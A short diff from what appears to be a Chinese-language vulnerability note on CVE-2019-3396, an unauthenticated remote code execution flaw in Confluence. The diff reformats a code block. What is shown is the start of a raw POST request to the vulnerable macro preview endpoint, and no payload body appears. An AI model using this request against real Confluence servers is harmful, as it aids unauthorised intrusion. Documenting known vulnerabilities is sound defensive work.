@@ -1,8 +1,8 @@
 CVE-2019-3396
 Confluence 未授权 RCE (CVE-2019-3396) 漏洞
 
-<pre><code>
-POST /rest/tinymce/1/macro/preview HTTP/1.1
+
+<pre><code>POST /rest/tinymce/1/macro/preview HTTP/1.1
 Host: 10.10.20.181
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
 Accept: text/plain, */*; q=0.01
